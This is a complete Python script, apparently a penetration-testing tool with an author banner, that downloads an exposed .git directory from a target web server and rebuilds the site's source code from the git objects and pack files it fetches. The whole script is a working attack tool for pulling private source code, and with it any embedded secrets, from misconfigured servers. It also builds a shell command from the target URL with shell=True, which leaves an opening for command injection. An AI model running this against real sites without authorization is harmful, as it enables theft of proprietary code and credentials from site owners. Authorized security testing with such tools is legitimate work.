import sys, os, subprocess
import wget
import requests
import re
import urlparse
import time


def banner():
	print("""
========================================================
  _______                      _____  _                 
 |__   __|                    |  __ \| |                
    | |_ __ _   _  ___   ___  | |__) | |__   __ _ _ __  
    | | '__| | | |/ _ \ / __| |  ___/| '_ \ / _` | '_ \ 
    | | |  | |_| | (_) | (__  | |    | | | | (_| | | | |
    |_|_|   \__,_|\___/ \___| |_|    |_| |_|\__,_|_| |_|
                                                       
 [+] Discord:  https://discord.gg/2GTZKwN
 [+] Facebook: https://www.facebook.com/292706121240740
 [+] Github:   https://github.com/truocphan
 [+] Gmail:    truocphan112017@gmail.com
 [+] Youtube:  https://www.youtube.com/channel/UCik-VqtPAeTus96sYMaiuBQ

========================================================
""")


headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"
}

dotgit = [
	"COMMIT_EDITMSG",
    "FETCH_HEAD",
    "HEAD",
    "ORIG_HEAD",
    "config",
    "description",
    "hooks/applypatch-msg.sample",
    "hooks/applypatch-msg.sample",
    "hooks/applypatch-msg.sample",
    "hooks/commit-msg.sample",
    "hooks/post-commit.sample",
    "hooks/post-receive.sample",
    "hooks/post-update.sample",
    "hooks/pre-applypatch.sample",
    "hooks/pre-commit.sample",
    "hooks/pre-push.sample",
    "hooks/pre-rebase.sample",
    "hooks/pre-receive.sample",
    "hooks/prepare-commit-msg.sample",
    "hooks/update.sample",
    "index",
    "info/exclude",
    "info/refs",
    "logs/HEAD",
    "logs/refs/heads/master",
    "logs/refs/remotes/origin/HEAD",
    "logs/refs/remotes/origin/master",
    "logs/refs/stash",
    "objects/info/packs",
    "packed-refs",
    "refs/heads/master",
    "refs/remotes/origin/HEAD",
    "refs/remotes/origin/master",
    "refs/stash"
]


class GITsource:
	def __init__(self, target):
		self.target = target
		self.Object_hash_unknown = list()
		self.Object_hash_valid = dict()


	def git_cat_file(self, SHA1_hash, option="p"):
		proc = subprocess.Popen("cd {}; git cat-file -{} {}".format(self.target.split("//")[-1].split(".git")[0], option, SHA1_hash), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
		(out, err) = proc.communicate()
		return out


	def Download_File_from_Server(self, url):
		if requests.get(url, headers=headers).status_code == 200:
			path = (urlparse.urlparse(url).netloc.replace(":", "_") + urlparse.urlparse(url).path).split("/")
			if not os.path.exists(os.path.join(*path[:-1])):
				os.makedirs(os.path.join(*path[:-1]))
			print(" Downloading: {}".format(url))
			if os.path.exists(os.path.join(*path)):
				os.remove(os.path.join(*path))
			wget.download(url, os.path.join(*path))
			print("\n")
			time.sleep(0.2)
			return True
		return False


	def DownloadFile_dotGIT(self):
		for i in dotgit:
			if self.Download_File_from_Server(self.target+i):
				f = open((self.target+i).split("//")[-1])
				content = f.read()
				f.close()
				for SHA1_hash in re.findall("[0-9a-fA-F]{40}", content):
					if SHA1_hash not in self.Object_hash_unknown:
						self.Object_hash_unknown.append(SHA1_hash)

	
	def DownloadObject_dotGIT(self):
		res = requests.get(self.target+"objects/", headers=headers)
		if re.search("<a href=\"[0-9a-fA-F]{2}/\">", res.text):
			for i in re.findall("<a href=\"([0-9a-fA-F]{2})/\">", res.text):
				if re.search("<a href=\"[0-9a-fA-F]{38}\">", requests.get(self.target+"objects/"+i, headers=headers).text):
					for j in re.findall("<a href=\"([0-9a-fA-F]{38})\">", requests.get(self.target+"objects/"+i, headers=headers).text):
						if not os.path.isfile(self.target.split("//")[-1]+"objects/"+i+"/"+j):
							if self.Download_File_from_Server(self.target+"objects/"+i+"/"+j) and re.search("^(commit|tree|blob)\n$", self.git_cat_file(str(i+j), "t")):
								self.Object_hash_valid[str(i+j)] = {
									"type": self.git_cat_file(str(i+j), "t")[:-1]
								}
						elif re.search("^(commit|tree|blob)\n$", self.git_cat_file(str(i+j), "t")):
							print("[+] Downloaded: {}\n".format(self.target+"objects/"+i+"/"+j))
							self.Object_hash_valid[str(i+j)] = {
								"type": self.git_cat_file(str(i+j), "t")[:-1]
							}
			if re.search("<a href=\"pack\-[0-9a-fA-F]{40}.*\">", requests.get(self.target+"objects/pack/", headers=headers).text):
				for i in re.findall("<a href=\"(pack\-[0-9a-fA-F]{40}.*)\">", requests.get(self.target+"objects/pack/", headers=headers).text):
					self.Download_File_from_Server(self.target+"objects/pack/"+i)
		else:
			tmp = self.Object_hash_unknown[:]
			for SHA1_hash in tmp:
				self.Download_Object(SHA1_hash)


	def Download_Object(self, SHA1_hash):
		if not os.path.isfile(self.target.split("//")[-1]+"objects/"+SHA1_hash[:2]+"/"+SHA1_hash[2:]):
			if self.Download_File_from_Server(self.target+"objects/"+SHA1_hash[:2]+"/"+SHA1_hash[2:]) and re.search("^(commit|tree|blob)\n$", self.git_cat_file(SHA1_hash, "t")):
				self.Object_hash_valid[SHA1_hash] = {
					"type": self.git_cat_file(SHA1_hash, "t")[:-1]
				}
				for i in re.findall("[0-9a-fA-F]{40}", self.git_cat_file(SHA1_hash)):
					if i not in self.Object_hash_unknown:
						self.Object_hash_unknown.append(i)
						self.Download_Object(i)
		elif re.search("^(commit|tree|blob)\n$", self.git_cat_file(SHA1_hash, "t")):
			print("[+] Downloaded: {}\n".format(self.target+"objects/"+SHA1_hash[:2]+"/"+SHA1_hash[2:]))
			self.Object_hash_valid[SHA1_hash] = {
				"type": self.git_cat_file(SHA1_hash, "t")[:-1]
			}
			for i in re.findall("[0-9a-fA-F]{40}", self.git_cat_file(SHA1_hash)):
				if i not in self.Object_hash_unknown:
					self.Object_hash_unknown.append(i)
					self.Download_Object(i)
		

	def getPathObject(self, SHA1_hash, path):
		path.append(self.Object_hash_valid[SHA1_hash]["name"])
		if self.Object_hash_valid[SHA1_hash]["tree"] == None:
			path.reverse()
			return True
		self.getPathObject(self.Object_hash_valid[SHA1_hash]["tree"], path)




def main():
	banner()
	if len(sys.argv) != 2:
		exit("""
 Usage: python {} <URL>
  Example: python {} http://example.com/.git/
""".format(sys.argv[0], sys.argv[0]))


	exploit = GITsource(sys.argv[1])
	exploit.DownloadFile_dotGIT()
	exploit.DownloadObject_dotGIT()
	if not os.path.exists(exploit.target.split("//")[-1]+"objects"):
		exit("[-] EXPLOITED FAIL!!!")

	for SHA1_hash in exploit.Object_hash_valid:
		if exploit.Object_hash_valid[SHA1_hash]["type"] == "commit":
			exploit.Object_hash_valid[SHA1_hash]["tree"] = None
			exploit.Object_hash_valid[SHA1_hash]["name"] = os.path.join(*exploit.target.split("//")[-1].split("/")[:-2])
			for i in re.findall("tree ([0-9a-fA-F]{40})", exploit.git_cat_file(SHA1_hash)):
				if i in exploit.Object_hash_valid.keys():
					exploit.Object_hash_valid[i]["tree"] = SHA1_hash
					exploit.Object_hash_valid[i]["name"] = "commit_"+re.findall("committer .* <.*> (\d+)", exploit.git_cat_file(SHA1_hash))[0]
		elif exploit.Object_hash_valid[SHA1_hash]["type"] == "tree":
			for i in re.findall("\d+ .* ([0-9a-fA-F]{40})\t(.*)", exploit.git_cat_file(SHA1_hash)):
				if i[0] in exploit.Object_hash_valid.keys():
					exploit.Object_hash_valid[i[0]]["tree"] = SHA1_hash
					exploit.Object_hash_valid[i[0]]["name"] = i[1]

	for SHA1_hash in exploit.Object_hash_valid:
		try:
			path = list()
			exploit.getPathObject(SHA1_hash, path)
			if exploit.Object_hash_valid[SHA1_hash]["type"] == "tree" and not os.path.exists(os.path.join(*path)):
				os.makedirs(os.path.join(*path))
				print("===> Folder: " + os.path.join(*path))
			elif exploit.Object_hash_valid[SHA1_hash]["type"] == "blob":
				if not os.path.exists(os.path.join(*path[:-1])):
					os.makedirs(os.path.join(*path[:-1]))
				f = open(os.path.join(*path), "wb")
				f.write(exploit.git_cat_file(SHA1_hash))
				f.close()
				print("===> File: " + os.path.join(*path))
		except Exception as e:
			if exploit.Object_hash_valid[SHA1_hash]["type"] == "blob" and not re.search("fatal: unable to stream {} to stdout".format(SHA1_hash), exploit.git_cat_file(SHA1_hash)):
				if not os.path.exists(os.path.join(exploit.target.split("//")[-1].split(".git")[0], "unknown")):
					os.makedirs(os.path.join(exploit.target.split("//")[-1].split(".git")[0], "unknown"))
				f = open(os.path.join(exploit.target.split("//")[-1].split(".git")[0], "unknown", SHA1_hash), "wb")
				f.write(exploit.git_cat_file(SHA1_hash))
				f.close()
				print("===> File: {}unknown/{}".format(exploit.target.split("//")[-1].split(".git")[0], SHA1_hash))





if __name__ == "__main__":
	main()